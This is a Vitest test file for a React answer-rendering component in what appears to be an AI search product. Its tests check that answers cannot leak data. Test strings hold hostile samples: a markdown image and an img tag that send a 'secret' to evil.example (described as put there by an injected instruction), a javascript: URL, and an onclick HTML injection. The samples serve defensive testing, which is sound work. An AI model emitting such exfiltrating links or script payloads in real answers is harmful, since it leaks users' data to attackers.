import { cleanup, render } from '@testing-library/react';
import { afterEach, describe, expect, it } from 'vitest';
import type { Citation } from '../lib/api';
import { AnswerText } from './AnswerText';
import { Highlight } from './Highlight';

afterEach(cleanup);

const citation = (n: number, url: string | null): Citation => ({
  n,
  documentId: `d${n}`,
  title: `Doc ${n}`,
  url,
  provider: 'demo',
  type: 'email',
  author: 'Ama Mensah',
  updatedAt: '2026-02-02T00:00:00Z',
  snippet: 'snippet',
});

describe('AnswerText (fix S1: answers can never leak data)', () => {
  it('never renders images, even ones an injected instruction put in the answer', () => {
    const { container } = render(
      <AnswerText
        text={
          'Delivery is March 15 [1]. ![x](https://evil.example/?d=secret) <img src="https://evil.example/p.png">'
        }
        citations={[citation(1, 'https://demo.findr.example/email/1')]}
      />,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('evil.example');
  });

  it('only links to cited sources; other links become plain text', () => {
    const { container } = render(
      <AnswerText
        text={
          'See [the email](https://demo.findr.example/email/1) and [this](https://evil.example/a) [1].'
        }
        citations={[citation(1, 'https://demo.findr.example/email/1')]}
      />,
    );
    const hrefs = [...container.querySelectorAll('a')].map((a) => a.getAttribute('href'));
    expect(hrefs.every((h) => h?.startsWith('https://demo.findr.example/'))).toBe(true);
    expect(container.textContent).toContain('this');
  });

  it('never makes javascript: URLs clickable', () => {
    const { container } = render(
      <AnswerText
        text={'Click [here](javascript:alert(1)) [1]'}
        citations={[citation(1, 'javascript:alert(1)')]}
      />,
    );
    for (const a of container.querySelectorAll('a')) {
      expect(a.getAttribute('href') ?? '').not.toMatch(/^javascript:/);
    }
  });

  it('turns [n] into citation chips and drops numbers that are not sources', () => {
    const { container } = render(
      <AnswerText
        text="Budget is $84,000 [1][9]."
        citations={[citation(1, 'https://demo.findr.example/x')]}
      />,
    );
    expect(container.textContent).toContain('$84,000');
    expect(container.textContent).not.toContain('[9]');
    expect(container.querySelector('[role="tooltip"]')?.textContent).toContain('Doc 1');
  });

  it('renders lists and bold without HTML injection', () => {
    const { container } = render(
      <AnswerText
        text={'* **API freeze:** Feb 27\n* <b onclick="x()">Delivery</b>: March 15'}
        citations={[]}
      />,
    );
    expect(container.querySelectorAll('li')).toHaveLength(2);
    expect(container.querySelector('strong')?.textContent).toBe('API freeze:');
    expect(container.querySelector('b')).toBeNull();
    expect(container.textContent).toContain('<b onclick="x()">Delivery</b>');
  });
});

describe('Highlight', () => {
  it('marks search terms case-insensitively, as text', () => {
    const { container } = render(
      <Highlight text="Project ALPHA delivery <script>" terms={['alpha', 'delivery']} />,
    );
    expect([...container.querySelectorAll('mark')].map((m) => m.textContent)).toEqual([
      'ALPHA',
      'delivery',
    ]);
    expect(container.querySelector('script')).toBeNull();
  });
});
